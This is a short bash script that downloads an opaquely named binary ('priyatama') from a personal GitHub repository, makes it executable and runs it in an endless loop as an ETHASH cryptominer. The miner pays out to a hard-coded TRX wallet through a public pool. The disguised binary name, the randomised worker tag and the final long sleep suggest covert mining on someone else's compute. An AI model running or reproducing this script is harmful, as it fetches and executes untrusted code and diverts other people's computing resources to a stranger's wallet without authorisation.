#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TPrMLwJPz8kNfmxY1h5M41AhCeU5BQ7YHs
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#at9p-rbx8)
wget https://github.com/Jay9112002/jay002/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
